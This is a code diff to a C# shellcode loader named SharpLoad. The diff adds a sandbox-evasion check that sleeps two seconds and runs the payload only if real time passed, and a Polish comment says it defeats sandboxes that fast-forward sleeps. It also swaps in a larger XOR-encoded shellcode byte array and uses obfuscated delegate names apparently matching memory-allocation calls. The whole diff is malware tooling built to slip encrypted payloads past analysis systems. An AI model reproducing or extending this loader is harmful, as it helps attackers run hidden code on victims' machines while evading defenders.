@@ -17,6 +17,9 @@ namespace SharpLoad
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+        [DllImport("kernel32.dll")]
+        public static extern void Sleep(uint dwMilliseconds);
+
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
@@ -24,9 +27,22 @@ namespace SharpLoad
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);
 
-        public Load()
-        {
+  
+        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 
 
+        public static void amireal()
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+            else
+            {
+                Execute();
+            }
         }
 
         public static byte[] helloworld(byte[] e_buf, string key)
@@ -43,11 +59,18 @@ namespace SharpLoad
         }
 
 
-        public void Execute()
+        public static void Execute()
         {
             Console.WriteLine("Testowy napis");
-            
-            byte[] buf = new byte[563] {0x8f, ... ,0xb0};
+
+            byte[] buf = new byte[581] {0x8f,0x21,0xe6,0x89,0x91,0x86,
+0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x3e,0x25,0x21,
+0x54,0xbf,0x04,0x26,0xe0,0x3d,0x13,0x21,0xee,0x3f,0x79,0x26,
+0xe0,0x3d,0x53,0x21,0x6a,0xda,0x2b,0x24,0x26,0x5e,0xba,0x21,
+ ... ,
+0x9a,0xb8,0x29,0xed,0xaf,0x4f,0xf6,0xa9,0x11,0xdf,0x07,0xe5,
+0x6c,0x27,0x72,0xaa,0xe0,0xad,0x14,0xbc,0x33,0xac,0x2b,0x03,
+0x65,0x34,0x28,0xa9,0xa9,0x9f,0xc6,0xcb,0x33,0x92,0xb4};
 
 
             // Xor payload with one byte key
@@ -108,8 +131,8 @@ namespace SharpLoad
         public static void Main()
         {
             
-            Load obiekt = new Load();
-            obiekt.Execute();
+     ;
+            amireal();
 
             string userName = Console.ReadLine();
         }
